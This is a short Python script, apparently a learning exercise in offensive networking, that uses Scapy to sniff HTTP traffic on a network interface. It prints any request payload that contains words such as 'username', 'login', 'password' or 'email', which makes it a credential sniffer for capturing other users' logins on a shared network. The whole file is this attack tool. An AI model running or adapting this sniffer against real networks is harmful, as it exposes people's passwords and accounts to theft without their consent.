#!/usr/bin/env python
import scapy.all as scapy
import argparse
from scapy.layers import http


def get_arguments():

    parser = argparse.ArgumentParser()
    help_mess = "interface to be used"
    parser.add_argument("-i", "--interface", dest="interface", help=help_mess)

    (options) = parser.parse_args()

    if not options.interface:
        print("[-] interface wasn't specified, using wlan0")
        options.interface = "wlan0"

    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    # Maybe make it more inclusive of other types of packets later
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass", "email"]
            for keyword in keywords:
                if keyword in load:
                    print(load)


def main():
    options = get_arguments()

    interface = options.interface

    sniff(interface)


main()
